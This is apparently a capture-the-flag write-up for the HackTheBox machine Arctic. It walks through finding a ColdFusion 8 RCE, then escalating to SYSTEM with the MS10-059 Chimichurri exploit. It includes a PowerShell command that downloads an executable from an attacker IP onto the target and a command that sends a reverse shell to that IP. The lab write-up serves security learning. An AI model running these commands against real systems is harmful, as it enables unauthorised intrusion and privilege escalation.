1,Recon
port scan
```
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

It is clear that service `Microsoft Windows RPC` and `FMTP` is opened.
Firstly, when we check the service of port 8500, we would redirect to this page
![](images/Pasted%20image%2020241101013107.png)

Then we can find the interesting page `/CFIDE/administrator`

![](images/Pasted%20image%2020241101013046.png)

It gives us the version of this service: `ADOBE COLDFUSION 8`
That means we can try to search the exploit of that from exploit-db.
`Adobe ColdFusion 8 - Remote Command Execution (RCE)`
That looks like a perfect one for us to get the shell.

Then when we run the exploit script and we can get the shell as tolis

2, shell as SYSTEM
By checking the sysinfo, we find the version of this machine
```
Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User

System Type:               x64-based PC
```

Given the complete lack of hotfixes, this is likely vulnerable to an exploit. I can use the sysinfo results to run Windows Exploit Suggester.

I’ll also need to install the Python xlrd library with python -m pip install xlrd.

PS:This is a python2 program.

`/opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2024-11-1-mssb.xls --systeminfo sysinfo` 
```
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

Looking at those, as I’m not as interested in MSF modules to start, and as IE is likely to require user interaction, ones to look into are:
```
MS10-047
MS10-059
MS10-061
MS10-073
MS11-011
MS13-005
```

I did some googling around for exploit code and found this GitHub from egre55 that included an exploit for MS10-059. I was particularly drawn to the fact that this binary requires an IP and port to connect to. Many of the exploits will start a new cmd as SYSTEM, which is nice if you are standing at the computer, but not so useful from a remote shell.

I downloaded the binary (while it’s never a great idea to run exes downloaded directly from the internet, for a CTF environment, I’m willing to run it), and we need to upload it to target machine.

`PowerShell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.17:8000/Chimichurri.exe', 'C:\ColdFusion8\wwwroot\CFIDE\ch.exe')"`

Then just handle the nc and run the exploit script
`ch.exe 10.10.16.17 443`

Then we can get the SYSTEM shell.




